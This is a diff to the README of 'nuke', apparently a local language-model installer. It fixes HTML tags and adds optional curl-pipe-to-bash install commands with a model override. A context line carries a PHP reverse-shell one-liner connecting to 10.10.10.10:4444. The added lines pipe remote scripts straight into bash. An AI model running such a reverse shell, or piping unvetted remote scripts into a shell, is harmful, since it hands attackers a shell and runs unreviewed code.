@@ -53,13 +53,13 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```
 
 
-<b> Then Type</b>
+<b> Then Type </b>
 ```
 nuke
 ```
 <br>
 
-<b> Smart Model Auto-Selection (based on your laptop RAM) <b>
+<b> Smart Model Auto-Selection (based on your laptop RAM) </b>
 
 | Laptop RAM   | Auto-selected Model                  | Approx. RAM Usage | Speed       |
 |--------------|--------------------------------------|-------------------|-------------|
@@ -73,6 +73,20 @@ Just run the installer — nuke automatically picks the **fastest possible model
 <br>
 
 <b> Now you are good to go ALL RADY..! </b>
+
+ Optional: Let power users override <b> (still one-liner) </b> 💀 Don't change if don't knoe 💀
+
+ ```
+# Force a specific model (example for 4GB laptop)
+curl -fsSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | MODEL=phi3 bash
+```
+<br> 
+```
+ <b> # Or force 32b on a beast machine </b>
+curl -fsSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | MODEL=qwen2.5:32b bash
+```
+
+
 <br> <br>
 <b> Made by with ❤️ <b>
  [![](https://img.shields.io/badge/✨wtf.mr✨-white?&style=social&logo=discord)](https://t.me/wtf.mr)
